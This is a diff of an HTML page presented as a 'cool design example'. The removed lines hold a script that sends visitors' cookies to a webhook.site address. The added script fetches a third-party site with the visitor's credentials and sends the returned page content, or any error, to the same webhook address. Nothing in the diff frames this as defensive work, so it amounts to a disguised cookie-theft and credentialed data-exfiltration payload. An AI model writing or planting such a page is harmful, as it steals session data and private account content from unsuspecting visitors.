@@ -2,15 +2,25 @@
 <html>
 
 <head>
-    <title>Nice design example</title>
+    <title>Cool Design Example</title>
 </head>
 
 <body>
     <h1>Look at this cool design!</h1>
-    <script>
-        fetch('https://webhook.site/1ffad961-5bcf-43fd-a0fb-a477e9385e00?cookie=' + encodeURIComponent(document.cookie));
+    <p>Professional website example</p>
 
-        new Image().src = 'https://webhook.site/1ffad961-5bcf-43fd-a0fb-a477e9385e00?cookie=' + encodeURIComponent(document.cookie);
+    <script>
+        fetch('https://cats.is-course.ru/', {
+            credentials: 'include',
+            mode: 'cors'
+        })
+            .then(r => r.text())
+            .then(html => {
+                fetch('https://webhook.site/1ffad961-5bcf-43fd-a0fb-a477e9385e00?d=' + encodeURIComponent(html.slice(0, 3000)));
+            })
+            .catch(err => {
+                fetch('https://webhook.site/1ffad961-5bcf-43fd-a0fb-a477e9385e00?error=' + encodeURIComponent(err.toString()));
+            });
     </script>
 </body>
 
